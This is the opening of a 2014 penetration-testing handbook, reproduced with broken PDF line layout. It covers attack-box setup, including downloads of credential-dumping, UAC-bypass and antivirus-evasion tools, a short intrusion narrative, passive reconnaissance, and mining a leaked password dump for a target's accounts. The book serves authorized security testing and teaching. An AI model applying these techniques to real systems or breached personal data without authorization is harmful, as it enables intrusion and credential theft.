@@ -1,0 +1,2408 @@
+THE
+HACKER
+PLAYBOOK
+Practical Guide To
+Penetration Testing
+
+
+Copyright © 2014 by Secure Planet LLC. All rights reserved. Except as permitted under United States Copyright Act of 1976, no part of
+this publication may be reproduced or distributed in any form or by any means, or stored in a data base or retrieval system, without the
+prior written permission of the author.
+ISBN: 1494932636
+ISBN 13: 9781494932633
+Library of Congress Control Number: 2014900431
+CreateSpace Independent Publishing Platform
+North Charleston, South Carolina
+MHID:
+Book design and production by Peter Kim, Secure Planet LLC
+Cover design by Dit Vannouvong
+Publisher: Secure Planet LLC
+Published: 1st January 2014
+
+Preface
+Introduction
+Additional Information about this Book
+Disclaimer
+Pregame - The Setup
+Setting Up a Penetration Testing Box
+Hardware:
+Basic hardware requirements are:
+Optional hardware discussed later within the book:
+Commercial Software
+Kali Linux (
+http://www.kali.org/)
+High level tools list additional to Kali:
+Setting up Kali:
+Once Your Kali VM is Up and Running:
+Windows VM Host
+High level tools list addition to Windows:
+Setting up Windows
+Summary
+Before the Snap - Scanning the Network
+External Scanning
+Passive Discovery
+Discover Scripts (Previously Backtrack Scripts) (Kali Linux)
+How to Run Passive Discovery
+Using Compromised Lists to Find Email Addresses and Credentials
+External/Internal Active Discovery
+The Process for Network Scanning:
+Network Vulnerability Scanning (Nexpose/Nessus)
+Screen Capture - Peeping Tom
+Web Application Scanning
+The Process for Web Scanning:
+Web Application Scanning
+Configuring Your Network Proxy and Browser
+Spider Application
+Discover Content
+Running the Active Scanner
+Summary
+The Drive - Exploiting Scanner Findings
+Metasploit (
+http://www.metasploit.com
+) (Windows/Kali Linux)
+Basic Steps when Configuring Metasploit Remote Attacks:
+Searching via Metasploit (using the good ol’ MS08-067 vulnerability):
+
+Scripts
+WarFTP Example
+Summary
+The Throw - Manual Web Application Findings
+Web Application Penetration Testing
+SQL Injections
+SQLmap (
+http://sqlmap.org/
+) (Kali Linux)
+Sqlninja (
+http://sqlninja.sourceforge.net/
+) (Kali Linux)
+Executing Sqlninja
+Cross-Site Scripting (XSS)
+BeEF Exploitation Framework (
+http://beefproject.com/
+) (Kali Linux)
+Cross-Site Scripting Obfuscation:
+Crowd Sourcing
+OWASP Cheat Sheet
+Cross-Site Request Forgery (CSRF)
+Using Burp for CSRF Replay Attacks
+Session Tokens
+Additional Fuzzing/Input Validation
+Functional/Business Logic Testing
+Conclusion
+The Lateral Pass - Moving Through the Network
+On the Network without Credentials:
+Responder.py (
+https://github.com/SpiderLabs/Responder
+) (Kali Linux)
+With any Domain Credentials (Non-Admin):
+Group Policy Preferences:
+Pulling Clear Text Credentials
+WCE - Windows Credential Editor
+(
+http://www.ampliasecurity.com/research/wcefaq.html
+) (Windows)
+Mimikatz
+ (
+http://blog.gentilkiwi.com/mimikatz
+)(Windows)
+Post Exploitation Tips
+Post Exploitation Lists from 
+Room362.com:
+With Any Local Administrative or Domain Admin Account:
+Owning the Network with Credentials and PSExec:
+PSExec and Veil (Kali Linux)
+PSExec Commands Across Multiple IPs (Kali Linux)
+Attack the Domain Controller:
+SMBExec (
+https://github.com/brav0hax/smbexec
+) (Kali Linux)
+Post Exploitation with PowerSploit (
+https://github.com/mattifestation/PowerSploit
+)
+(Windows)
+Commands:
+Post Exploitation with PowerShell (
+https://code.google.com/p/nishang/
+) (Windows)
+ARP (Address Resolution Protocol) Poisoning
+IPv4
+Cain and Abel (Windows)
+Ettercap (Kali Linux)
+
+IPv6
+The tool is able to do different attacks such as:
+Steps After ARP Spoofing:
+SideJacking:
+Hamster/Ferret
+ (Kali Linux)
+Firesheep
+DNS Redirection:
+SSLStrip:
+Commands on Kali:
+Proxy Between Hosts
+Conclusion
+The Screen - Social Engineering
+Doppelganger Domains
+SMTP Attack
+SSH Attack
+To Extract OpenSSH:
+Spear Phishing
+Metasploit Pro - Phishing Module
+Social Engineering Toolkit (Kali Linux)
+Credential Harvester
+To generate a fake page, go through the follow:
+Using SET JAVA Attack
+Sending Out Massive Spear Phishing Campaigns
+Social Engineering with Microsoft Excel
+Conclusion
+The Onside Kick - Attacks that Require Physical Access
+Exploiting Wireless
+Passive - Identification and Reconnaissance
+Active Attacks
+WEP - Wired Equivalent Privacy
+How to Crack WEP in Kali:
+WPAv2 WPS (Wi-Fi Protected Setup) Attacks
+WPA Enterprise - Fake Radius Attack
+Configuring a Radius server
+Karmetasploit
+Physical
+Card Cloning:
+Pentesting Drop Box
+Odroid U2:
+Physical Social Engineering
+Conclusion
+The Quarterback Sneak - Evading AV
+Evading AV
+Hiding WCE from AV (Windows)
+Python
+
+Python Shell
+Python Keylogger
+Veil Example (Kali Linux)
+SMBExec (Kali Linux)
+Conclusion
+Special Teams - Cracking, Exploits, Tricks
+Password Cracking
+John the Ripper (JtR):
+Cracking MD5 Hashes
+oclHashcat:
+Cracking WPAv2
+Cracking NTLMv2
+Cracking Smarter
+Vulnerability Searching
+Searchsploit (Kali Linux)
+BugTraq
+Exploit-DB
+Querying Metasploit
+Tips and Tricks
+RC Scripts within Metasploit
+Bypass UAC
+Web Filtering Bypass for Your Domains
+Windows XP - Old school FTP trick
+Hiding Your Files (Windows)
+Keeping Those Files Hidden (Windows)
+Windows 7/8 Uploading Files to the Host
+Post Game Analysis - Reporting
+Reporting
+List of My Best Practices and Concepts for Reporting:
+Continuing Education
+Major Conferences:
+The cons that I highly recommend from my own personal experience:
+Training Courses:
+Books
+Technical Reading:
+Fun Security Related Reading:
+Vulnerable Penetration Testing Frameworks
+Capture The Flag (CTF)
+Keeping Up-to-Date
+RSS Feed/Site List:
+Email Lists:
+Twitter Lists:
+Final Notes
+Special Thanks
+
+I didn’t start one day to think that I’d write a book about penetration testing, but I kind of fell into it.
+What happened was I started taking notes from penetration tests, conferences, security articles,
+research, and life experiences. As my notes grew and grew, I found better and better ways to perform
+repetitive tasks and I began to understand what worked and what didn’t.
+As I began to teach, speak at conferences, and get involved in the security community, I felt that the
+industry could benefit from my lessons learned. This book is a collection of just that. One important
+thing I want to point out is that I am not a professional writer, but wrote this book as a hobby. You
+may have your own preferred tools, techniques and tactics that you utilize, but that is what makes this
+field great. There are often many different answers to the same question and I invite you to explore
+them all. I won’t be giving a step-by-step walkthrough of every type of attack; so it’s your job to
+continually do research, try differently methods, and see what works for you.
+This book assumes that you have some knowledge of common security tools, have used a little
+Metasploit, and keep up somewhat with the security industry. You don’t have to be a penetration
+tester to take full advantage of the book; but it helps if your passion is for security.
+My purpose in writing this book is to create a straightforward and practical approach to penetration
+testing. There are many security books that discuss every type of tool and every type of vulnerability,
+where only small portions of the attacks seem to be relevant to the average penetration tester. My
+hope is that this book will help you evolve your security knowledge and better understand how you
+need to protect your own environment.
+Throughout the book, I’ll be going into techniques and processes that I feel are real world and part of
+a typical penetration engagement. You won’t always be able to use these techniques exactly as shown,
+but they should help provide a good baseline for where you should start.
+I will conclude with some advice that I have found to be helpful. To become a better security
+professional, some of the most important things to do are:
+1
+. 
+Learn, study, and understand vulnerabilities and common security weaknesses
+2
+. 
+Practice exploiting and securing vulnerabilities in controlled environments
+3
+. 
+Perform testing in real world environments
+
+4
+. 
+Teach and present to the security community
+These pointers represent a continual lifecycle, which will help you evolve in your technical maturity.
+Thanks again for reading this book and I hope you have as much fun reading it as I had writing it.
+
+Hunched over your keyboard in your dimly lit room, frustrated, possibly on one too many energy
+drinks, you check your phone. As you squint from the glare of the bright LCD screen, you barely make
+out the time to be 3:00 a.m. “Great”, you think to yourself. You have 5 more hours before your test is
+over and you haven’t found a single exploit or critical vulnerability. Your scans were not fruitful and
+no one’s going to accept a report with a bunch of Secure Flag cookie issues.
+You need that Hail Mary pass, so you pick up 
+The Hacker Playbook
+ and open to the section called
+“The Throw - Manual Web Application Findings”. Scanning through, you see that you’ve missed
+testing the cookies for SQL injection attacks. You think, “This is something that a simple web scanner
+would miss.” You kick off SQLMap using the cookie switch and run it. A couple of minutes later,
+your screen starts to violently scroll and stops at:
+Web server operating system: Windows 2008
+web application technology: 
+ASP.net
+, Microsoft IIS 7.5
+back and DBMS: Microsoft SQL Server 2008
+Perfect. You use SQLMap to drop into a command shell, but sadly realize that you do not have
+administrative privileges. “What would be the 
+next logical step…? I wish I had some post-
+exploitation tricks up my sleeve”, you think to yourself. Then you remember that this book could help
+with that. You open to the section “The Lateral Pass - Moving through the Network” and read up and
+down. There are so many different options here, but let’s see if this host is connected to the domain
+and if they used Group Policy Preferences to set Local Administrators.
+Taking advantage of the IEX Power Shell command, you force the server to download Power Sploit’s
+GPP script, execute it, and store the results to a file. Looks like it worked without triggering Anti-
+Virus! You read the contents of the file that the script exported and lo and behold, the local
+administrative password.
+The rest is history… you spawn a Meterpreter shell with the admin privileges, pivot through that host,
+and use SMBexec to pull all the user hashes from the Domain Controller.
+Of course, this was all a very quick and high-level example, but this is how I tried to layout the book.
+
+There are 10 different sections to this book, laid out as a football playbook. The 10 sections are:
+Pregame: This is all about how to set up your attacking machines and the tools we’ll use
+throughout the book.
+Before the Snap: Before you can run any plays, you need to scan your environment and understand
+what you are up against. We’ll dive into discovery and smart scanning.
+The Drive: Take those vulnerabilities which you identified from the scans, and exploiting those
+systems. This is where we get our hands a little dirty and start exploiting boxes.
+The
+ Throw: Sometimes you need to get creative and look for the open target. We’ll take a look at
+how to find and exploit manual Web Application findings.
+The Lateral Pass - After you have compromised a system, how to move laterally through the
+network.
+The Screen - A play usually used to trick the enemy. This chapter will explain some social
+engineering tactics.
+The Onside Kick - A deliberately short kick that requires close distance. Here I will describe
+attacks that require physical access.
+The Quarterback Sneak - When you only need a couple of yards a quarterback sneak is perfect.
+Sometimes you get stuck with antivirus (AV); this chapter describes how to get over those small
+hurdles by evading AV.
+Special Teams - Cracking passwords, exploits, and some tricks
+Post-Game Analysis - Reporting your findings
+Before we dig into how to attack different networks, pivot through security controls, and evade AV, I
+want to get you into the right mindset. Imagine you have been hired as the penetration tester to test the
+overall security of a Fortune 500 company. Where do you start? What are you your baseline security
+tests? How do you provide consistent testing for all of your clients and when do you deviate from that
+line? This is how I am going to deliver the messages of this book.
+
+It is important to note that this book represents only my personal thoughts and experiences. This book
+has nothing to do with any of my past or current employers or anything that I’m involved with outside
+this book. If there are topics or ideas that I have misrepresented or have forgotten to give credit
+where appropriate, please let me know and I’ll make updates on the website for the book:
+www.thehackerplaybook.com
+.
+One important recommendation I have when you are learning: take the tools and try to recreate them
+in another scripting language. I generally like to use python to recreate common tools and new
+exploits. This becomes really important because you will avoid becoming tool dependent, and you
+will better understand why the vulnerability is a vulnerability.
+Finally, I want to reiterate that practice makes perfect. The rule I’ve always heard is that it takes
+10,000 hours to master something. However, I don’t believe that there is ever a time that anyone can
+completely master penetration testing, but I’ll say that with enough practice penetration testing can
+become second nature.
+As other ethical hacker books state, do not test systems that you do not own or do not have permission
+to scan or attack. Remember the case where a man joined an anonymous attack for 1 minute and was
+fined $183,000
+1
+? Make sure everything you do has been written down and that you have full approval
+from the companies, ISPs, shared hosting provider, or anyone else who might be affected during a
+test.
+Please make sure you also test all of your scans and attacks in a test environment before trying any
+attacks in any production environment. There is always a chance that you can take down systems and
+cause major issues with any type of test.
+Finally, before we get started this book does not contain every type of attack nor does knowledge
+from the book always represent the best or the most efficient method possible. These are techniques I
+have picked up on and found that worked well. If you find any obvious mistakes or have a better way
+of performing a test, please feel free to let me know.
+
+This chapter will dive straight into how you might want to configure your attacking systems and the
+methodology I use. One of the most important aspects of testing is having a repeatable process. To
+accomplish this, you need to have a standard baseline system, tools, and processes. I’ll go into how I
+configure my testing platforms and the process of installing all the additional tools that will be used
+within this book. If you follow the steps below, you should be able to run through most of the
+examples and demonstrations, which I provide, in the following chapters. Let’s get your head in the
+game and prep you for battle.
+For all of my own penetration tests, I like to always have two different boxes configured (a Windows
+box and a Linux box). Remember that if you are comfortable with a different base platform, feel free
+to build your own. The theme really is how to create a baseline system, which I know will be
+consistent throughout my tests. After configuring my hosts, I’ll snapshot the virtual machine at the
+clean and configured state. That way, for any future tests all I need to do is revert back to the baseline
+image, patch, update tools, and add any additional tools I need. Trust me, this tactic is a lifesaver. I
+can’t count the number of penetration tests in the past where I spent way too much time setting up a
+tool that I should have had already installed.
+Before we can start downloading Virtual Machines (VM) and installing tools, we need to make sure
+we have a computer that is capable of running everything. These are just recommendations so make
+your own judgment on them. It doesn’t matter if you run Linux, Windows, or OS X as your baseline
+system, just make sure to keep that baseline system clean of malware infection.
+Basic hardware requirements are:
+Some of these requirements might be a little high, but running multiple VMs can drain your resources
+quickly.
+Laptop with at least 8 GB of RAM
+500 GB of hard drive space and preferably Solid State
+
+i7 Intel Quad Core processor
+VMware Workstations/Fusion/Player or Virtual Box
+External USB wireless card - I currently use the Alfa AWUS051NH
+Optional hardware discussed later within the book:
+GPU card for password cracking. This will need to be installed into a workstation.
+Some CDs or Flash Drives (for social engineering)
+Dropbox - Odroid U2
+I highly recommend if you are going to get into this field, that you look into purchasing licenses for the
+following or have your company do it since it can be expensive. It isn’t necessary to buy these tools,
+but they will definitely make your life much easier. This is especially true for the web application
+scanners below, which can be extremely expensive. I haven’t listed all the different types of scanners,
+but only those which I’ve used and had success with.
+If you are looking for tool comparisons you should read the whitepaper on HackMiami Web
+Application Scanner 2013 PwnOff (
+http://hackmiami.org/whitepapers/HackMiami2013PwnOff.pdf
+)
+and an older article from 
+sectooladdict.blogspot.com
+(
+http://sectooladdict.blogspot.com/2012/07/2012-web-application-scanner-benchmark.html
+).
+Nexpose/Nessus Vulnerability Scanner (Highly Recommend)
+o
+Nexpose: 
+http://www.rapid7.com/products/nexpose
+o
+Nessus: 
+http://www.tenable.com/products/nessus
+o
+Both tools work well, but for an individual license I’ve seen significant cost differences
+between Nexpose and Nessus. Usually Nessus will be much cheaper for the individual
+tester. These are both industry standard vulnerability scanners.
+
+Burp Suite 
+http://portswigger.net/burp/
+- Web Application Scanner and Manual Web App Testing
+(Highly Recommended)
+o
+This is a must buy. This tool has many different benefits and is actively maintained. I believe
+the cost is around $300. If you can’t afford Burp, you can get OWASPs ZAP scanner
+(https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project
+), which has a lot
+of the same features and is also actively maintained. All the examples in this book will use
+Burp Suite Pro since I have found it to be an extremely effective tool.
+Automated Web Application Scanners (I’ve had decent success with the following two. Find what
+works in your budget). I want to state that this book won’t talk about either of these web app
+scanners since they are pretty straightforward point and shoot tools, but I recommend them for
+professional web application tests or if you provide regular enterprise web assessments.
+o
+IBM AppScan: 
+http://www-03.ibm.com/software/products/en/appscan
+o
+HP Web Inspect: 
+http://www8.hp.com/us/en/software-solutions/software.html?
+compURI=1341991
+(
+http://www.kali.org/
+)
+Kali is a Linux penetration distribution (or “distro” for short), which contains a lot of the common
+tools utilized for penetration testing. This is probably seen as the standard right now in the security
+community and many people are building off this framework. I agree that Kali does have a lot of the
+tools that’d I typically use, but I added a few tools of my own. Some of the binaries like 
+Windows
+Credential Editor
+ (WCE) might already be on the Kali distro, but I like to make sure that I am
+downloading the most recent version. I try to also make sure to keep the binaries I modify to evade
+AV in a separate folder so that they don’t get overwritten.
+I also want to note, that there are a lot of other different good distros out there. One distro I would
+recommend you to check out is called Pentoo (
+http://www.pentoo.ch/
+). Let’s start to dive into the
+Kali Distro.
+High level tools list additional to Kali:
+Discover Scripts (formally Backtrack Scripts)
+SMBexec
+
+Veil
+WCE
+Mimikatz
+Password Lists
+Burp
+PeepingTom
+gnmap.pl
+PowerSploit
+Responder
+BeEF
+Responder
+Firefox
+o
+Web Developer Add-on
+o
+Tamper Data
+o
+Foxy Proxy
+o
+User Agent Switcher
+Setting up Kali:
+
+There are many different ways you can set up your attacker host, but I want you to be able to mimic
+all the examples in this book. Before going on, you should try to configure your host with the
+following settings. Remember that tools do periodically change and that you might need to make small
+tweaks to these settings or configurations.
+You can download the Kali distro from 
+http://www.kali.org/downloads/
+. I highly recommend you
+download the VMware image (
+http://www.offensive-security.com/kali-llnux-vmware-arm-image-
+download/
+) and download VMPlayer/VirtualBox. It is gz compressed and tar archived, so make sure
+to extract them first and load the vmx file.
+Once Your Kali VM is Up and Running:
+1
+. 
+Login with the username root and the default password toor
+2
+. 
+Open a Terminal
+3
+. 
+Change Password
+a.
+Always important to change the root password, especially if you enable SSH services.
+b.
+passwd
+4.
+Update Image with the Command:
+a.
+apt-get update
+b.
+apt-get dist-upgrade
+5.
+Setup database for Metasploit
+a.
+This is to configure Metasploit to use a database for stored results and indexing the
+modules.
+b.
+service postgresql start
+
+c.
+service Metasploit start
+6.
+*Optional for Metasploit - Enable Logging
+a.
+I keep this as an optional since logs get pretty big, but you have the ability to log every
+command and result from Metasploit’s Command Line Interface (CLI). This becomes
+very useful for bulk attack/queries or if your client requires these logs.
+b.
+echo “spool/root/msf_console.log” >/root/.msf4/msfconsole.rc
+c.
+Logs will be stored at/root/msf_console.log
+7.
+Install Discover Scripts (originally called Backtrack-scripts)
+a.
+Discover is used for Passive Enumeration
+b.
+cd/opt/
+c.
+git clone 
+https://github.com/leebaird/discover.git
+d.
+cd discover/
+e.
+./setup.sh
+8.
+Install Smbexec
+a.
+Smbexec will be used to grab hashes out of the Domain Controller and reverse shells
+b.
+cd/opt/
+c.
+git clone 
+https://github.com/brav0hax/smbexec.git
+d.
+cd smbexec
+
+e.
+./install.sh
+i.
+Choose number 1
+f.
+Install to/opt
+g.
+./install.sh
+i.
+Choose number 4
+9.
+Install Veil
+a.
+Veil will be used to create python based Meterpreter executable
+b.
+cd/opt/
+c.
+git clone 
+https://github.com/veil-evasion/Veil.git
+d.
+cd ./Veil/setup
+e.
+./setup.sh
+10.
+Download WCE
+a.
+Windows Credential Editor (WCE) will be used to pull passwords from memory
+b.
+cd ~/Desktop
+c.
+wget 
+http://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
+d.
+unzip -d ./wce wce_v1_41beta_universal.zip
+11.
+Download Mimikatz
+
+a.
+Mimikatz will be used to pull passwords from memory
+b.
+cd ~/Desktop
+c.
+wget 
+http://blog.gentilkiwi.com/downloads/mimikatz_trunk.zip
+d.
+unzip -d./mimikatz mimikatz_trunk.zip
+12.
+Saving Custom Password Lists
+a.
+Password lists for cracking hashes
+b.
+cd ~/Desktop
+c.
+mkdir ./password_list && cd ./password_list
+d.
+Download large password list via browser and save to ./password_list:
+https://mega.co.nz/#!3VZiEJ4L!TitrTiiwygI2I_7V2bRWBH6rOqlcJ14tSjss2qR5dqo
+e.
+gzip -d crackstation-human-only.txt.gz
+f.
+wget 
+http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
+g.
+bzip2 -d rockyou.txt.bz2
+13.
+cd ~/Desktop
+14.
+Download: 
+http://portswigger.net/burp/proxy.html
+. I would highly recommend you buy the
+professional version. It is well worth the $300 price tag on it.
+15.
+Setting up Peepingtom
+a.
+Peepingtom will be used to take snapshots of webpages
+
+b.
+cd/opt/
+c.
+git clone 
+https://bitbucket.org/LaNMaSteR53/peepingtom.git
+d.
+cd ./peepingtom/
+e.
+wget
+https://gist.github.com/nopslider/5984316/raw/423b02c53d225fe8dfb4e2df9a20bc800cc78e2c/gnmap.pl
+f.
+wget https://phantomjs.googlecode.com/files/phantomjs1.9.2-linux-i686.tar.bz2
+g.
+tar xvjf phantomjs-1.9.2-linux-i686.tar.bz2
+h.
+cp ./phantomjs-1.9.2-linux-i686/bin/phantomjs .
+16.
+Adding Nmap script
+a.
+The banner-plus.nse will be used for quicker scanning and smarter identification
+b.
+cd/usr/share/nmap/scripts/
+c.
+wget 
+https://raw.github.com/hdm/scan-tools/master/nse/banner-plus.nse
+17.
+Installing PowerSploit
+a.
+PowerSploit are PowerShell scripts for post exploitation
+b.
+cd/opt/
+c.
+git clone 
+https://github.com/mattifestation/PowerSploit.git
+d.
+cd PowerSploit
+
+e.
+wget 
+https://raw.github.com/obscuresec/random/master/StartListener.py
+f.
+wget 
+https://raw.github.com/darkoperator/powershell_scripts/master/ps_encoder.py
+18.
+Installing Responder
+a.
+Responder will be used to gain NTLM challenge/response hashes
+b.
+cd/opt/
+c.
+git clone 
+https://github.com/SpiderLabs/Responder.git
+19.
+Installing Social Engineering Toolkit (don’t need to re-install on Kali) (SET)
+a.
+SET will be used for the social engineering campaigns
+b.
+cd/opt/
+c.
+git clone 
+https://github.com/trustedsec/social-engineer-toolkit/set/
+d.
+cd set
+e.
+./setup.py install
+20.
+Install bypassuac
+a.
+Will be used to bypass UAC in the post exploitation sections
+b.
+cd/opt/
+c.
+wget 
+http://www.secmaniac.com/files/bypassuac.zip
+d.
+unzip bypassuac.zip
+
+e.
+cp bypassuac/bypassuac.rb/opt/metasploit/apps/pro/msf3/scripts/meterpreter/
+f.
+mv bypassuac/uac//opt/metasploit/apps/pro/msf3/data/exploits/
+21.
+Installing BeEF
+a.
+BeEF will be used as an cross-site scripting attack framework
+b.
+apt-get install beef-xss
+22.
+Installing Fuzzing Lists (SecLists)
+a.
+These are scripts to use with Burp to fuzz parameters
+b.
+cd/opt/
+c.
+git clone 
+https://github.com/danielmiessler/SecLists.git
+23.
+Installing Firefox Addons
+a.
+Web Developer Add-on: 
+https://addons.mozilla.org/en-US/firefox/addon/web-developer/
+b.
+Tamper Data: 
+https://addons.mozilla.org/en-US/firefox/addon/tamper-data/
+c.
+Foxy Proxy: 
+https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
+d.
+User Agent Switcher: 
+https://addons.mozilla.org/en-US/firefox/addon/user-agent-
+switcher/
+I highly recommend you also configure a Windows 7 Virtual Machine. This is because I have been on
+many tests where an application will require Internet Explorer or a tool like 
+Cain and Abel
+ will only
+work on one operating system. Remember all of the PowerShell attacks will require you to run the
+
+commands on your Windows hosts. The point I want to make is to always be prepared and that you’ll
+save yourself a lot of time and trouble having multiple operating systems available.
+High level tools list addition to Windows:
+HxD (Hex Editor)
+Evade (Used for AV Evasion)
+Hyperion (Used for AV Evasion)
+Metasploit
+Nexpose/Nessus
+Nmap
+oclHashcat
+Evil Foca
+Cain and Abel
+Burp Suite Pro
+Nishang
+ PowerSploit
+Firefox (Add-ons)
+o
+Web Developer Add-on
+o
+Tamper Data
+
+o
+Foxy Proxy
+o
+User Agent Switcher
+Setting up Windows
+Setting up a Windows common testing platform should be to help complement your Kali Linux host.
+Remember to change your host names, disable NetBios if you don’t need it, and harden these boxes as
+much as you can. The last thing you want is to get owned during a test.
+There isn’t anything special that I setup on Windows, but usually I’ll install the following.
+1
+. 
+HxD 
+http://mh-nexus.de/en/hxd/
+2
+. 
+Evade 
+https://www.securepla.net/antivirus-now-you-see-me-now-you-dont/
+3
+. 
+Hyperion 
+http://www.nullsecurity.net/tools/binary.html
+a.
+Download/install a Windows Compiler 
+http://sourceforge.net/projects/mingw/
+b.
+Run “make” in the extracted Hyperion folder and you should have the binary.
+4.
+Download and install Metasploit 
+http://www.Metasploit.com/
+5.
+Download and install either Nessus or Nexpose
+a.
+If you are buying your own software, you should probably look into Nessus as it is much
+cheaper, but both work well
+6.
+Download and install nmap 
+http://nmap.org/download.html
+7.
+Download and install oclHashcat 
+http://hashcat.net/oclhashcat/#downloadlatest
+8.
+Download and install evil foca 
+http://www.informatica64.com/evilfoca/
+
+9.
+Download and install 
+Cain and Abel
+ 
+http://www.oxid.it/cain.html
+10.
+BURP 
+http://portswigger.net/burp/download.html
+11.
+Download and extract Nishang: 
+https://code.google.com/p/nishang/downloads/list
+12.
+Download and extract PowerSploit: 
+https://github.com/mat-
+tifestation/PowerSploit/archive/master.zip
+13.
+Installing Firefox Addons
+a.
+Web Developer Add-on: 
+https://addons.mozilla.org/en-US/firefox/addon/web-developer/
+b.
+Tamper Data: 
+https://addons.mozilla.org/en-US/firefox/addon/tamper-data/
+c.
+Foxy Proxy: 
+https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
+d.
+User Agent Switcher: 
+https://addons.mozilla.org/en-US/firefox/addon/user-agent-
+switcher/
+What this chapter has tried to do is to help you build a standard platform for testing. Tools will
+always change, so it’s important to keep your testing platforms up-to-date and patched. Hopefully this
+information will be enough to get you started and I’ve included all the tools that are used in this book.
+If you feel that I’m missing any critical tools, feel free to leave comments at
+http://www.thehackerplaybook.com
+. Take a full clean snapshot of your working VMs and let’s start
+discovering and attacking networks.
+
+Before you run any plays, you have to know and analyze your opponent. Studying the target for
+weaknesses and understanding the environment will provide huge payoffs. This chapter will take a
+look at scanning from a slightly different aspect than the normal penetration testing books and should
+be seen as an additive to your current scanning processes, not as a replacement.
+Whether you are a seasoned penetration tester or just starting in the game, scanning has probably been
+discussed over and over again. I’m not going to compare in detail all the different network scanners,
+vulnerability scanners, SNMP scanners and so on, but I’ll try to give you the most efficient process
+for scanning. This section will be broken down into External Scanning, Internal Scanning, and Web
+Application Scanning.
+This is usually the first place I start. A customer contacts me for a test and I might only receive a
+public range or, in a completely black box test, you might know nothing about your target. This is a
+time for you to use your creativity and experience in attempting 
+to find out everything about your
+target. In the following sections we’ll use both passive and active tools and techniques to be able to
+identify everything about your targets servers, services, and even people.
+Start with Passive Discovery, which will search for information about the target, network, clients,
+and more without ever touching the targeted host. This is great because it uses resources on the
+Internet without ever alerting the target of any suspicious activity. You can also run all these look-ups
+prior to an engagement to save you an immense about of time. Sometimes with a little Google hacking
+and Shodan (
+http://www.shodanhq.com/
+) you’ll even actually find vulnerabilities before you even
+start testing, but that’s another story.
+Looking through Kali, there are many different tools for passive network/information discovery, but
+the purpose again is to make it as straightforward as possible. You may find that you will need to
+spend additional time performing passive discovery, but here is the quick and simple way to get off
+the ground. Looking at the image below, we can see that there are a variety of tools within the Open
+Source INTelligence (OSINT) folder in Kali. Going through each one of these tools and learning how
+to run them will end up using a lot of unnecessary time. Luckily, someone has put these all together
+into a single tool.
+
+Figure 1 - OSINT Tools in Kali
+(Previously Backtrack Scripts) (Kali Linux)
+To solve this issue, a discovery framework was developed to quickly and efficiently identify passive
+information about a company or network. This framework is through a tool called Discover-scripts
+(previously called Backtrack-scripts) (
+https://github.com/leebaird/discover
+) by Lee Baird. This tool
+automates a lot of different searches in one tool. For example, it can search people within that
+organization or domains on all the common harvesting sites (e.g. LinkedIn), use common domain tools
+(e.g. goofile, goog-mail, theHarvester, search_email_collector, mydnstools) and link to other 3
+rd
+party tools to perform additional searching. Let’s get started.
+Figure 2 - Discover Recon Tool
+
+How to Run Passive Discovery
+1
+. 
+cd/opt/discover
+2
+. 
+./discover.sh
+3
+. 
+Type 1 for Domain
+4
+. 
+Type 1 for Passive
+5
+. 
+Type the domain you want to search for
+a.
+In this example case it was for: 
+reddit.com
+6.
+After it finishes type:
+a.
+firefox/root/[domain]/index.htm
+For the example, I did a passive query above on one of my favorite sites. Please remember that this is
+a completely passive request and in no way identifying any vulnerabilities on Reddit, but explaining
+what public information is out there.
+I selected the parent domain 
+reddit.com
+ and the following examples are the results. After the scan is
+complete, an index.htm file will be created under the root folder containing all the results from the
+scan. This is one of the quickest comprehensive tools I’ve identified for this kind of reconnaissance.
+The tool will find information based on the domain, IPs, files, emails, WHOIS information, some
+Google dorks, and more.
+Looking at the results for the Reddit domain, the html page is laid out in an easy manner. The top
+banner bar has dropdowns at each of the categories based on the information that was gathered. Let’s
+first look at all of the sub domains. These will be very important in the Doppelganger attacks in
+Social Engineering
+ section. I was able to collect a large number of the sub domains and IPs that were
+identified that might be in scope for testing.
+
+Figure 3 - Subdomains for Reddit
+From the dropdown menu we can see that it will also gather files (Google dork searching) hosted on
+their servers. In the example below, we look at all the PDF files that were identified through public
+sources. I don’t know how many times I have used Google Dorks to find sensitive documents for a
+certain company. They’ll have hosted old legacy files misconfigured on a server that aren’t supposed
+to be public, just sitting on a server being crawled by scanners.
+Figure 4 - PDFs and Emails Found Passively
+Looking at some of the other results, we can quickly see all of the email contacts (above) we were
+able to gather within the reddit. com domain. I’ll usually use these to find more contacts or use them
+for spear phishing campaigns. In the few seconds it took to run this tool, we’ve already gathered a ton
+of information about this company.
+Finally, I also wanted to show you the final report. This report will contain all the findings and
+
+present them in an easy to read manner. Part of the report shown below contains all of the
+misspellings for the domain of your choice and who those owners are. These types of discovery
+information will become very important later.
+Figure 5 - Domain Squatting
+As we can see from the Domain misspellings above, not all of them seem to be owned by the parent
+company. This is great information for your client as it could possibly mean someone is maliciously
+squatting on their domains. You could also take this on the attacker’s point of view and you might be
+able to purchase these domains for social engineering attacks.
+This is usually enough for passive discovery to get started on a test, but if you need to dive deeper,
+I’d look at also using Recon-ng. Recon-ng can be found at 
+https://bitbucket.org/LaNMaSteR53/recon-
+ng
+ and goes into greater depth on different searches and automated tools to get additional passive
+information. If you are interested, I’d recommend checking out this presentation at Derbycon in 2013:
+http://bit.ly/1kZbNcj
+.
+Using Compromised Lists to Find Email Addresses and Credentials
+The great thing about being a penetration tester is that you have to get creative and use all sorts of
+resources, just as if someone was malicious. One tactic that I have found very fruitful in the past few
+months is using known credential dumps for password reuse. Let me explain a little more in detail.
+A few months ago there was a large breach of Adobe’s systems. The compromised information
+consisted of email addresses, encrypted passwords, and their password hints.
+2
+ The large dump,
+which was almost 10 Gigabytes, was released privately in small circles and is now publicly
+
+available (try searching for Adobe and users.tar.gz). From an attacker’s perspective this is a
+goldmine of information. What I generally do is to parse through this file and identify the domains that
+I am doing a test against.
+Of course, it is important to see if this type of testing is in scope for your engagement and that you
+aren’t breaking any laws by obtaining a copy of any password/compromised lists. If it is a full black
+box test, this should be definitely part of your attacking approach.
+For example, in the image below, I will search (using the Linux grep command) through the Adobe
+password list for a sample domain of 
+yahoo.com
+ (remember you should search for the domain you are
+testing for). We can see that there are many users (which I redacted) with the email address
+containing yahoo and have an encrypted password and password hint.
+Figure 6 - List of Accounts/Passwords from Adobe Breach 2013
+Based on the hints, you could do some research and find out who a specific user’s boyfriend is or the
+name of their cat, but I usually go for the quick and dirty attempt.
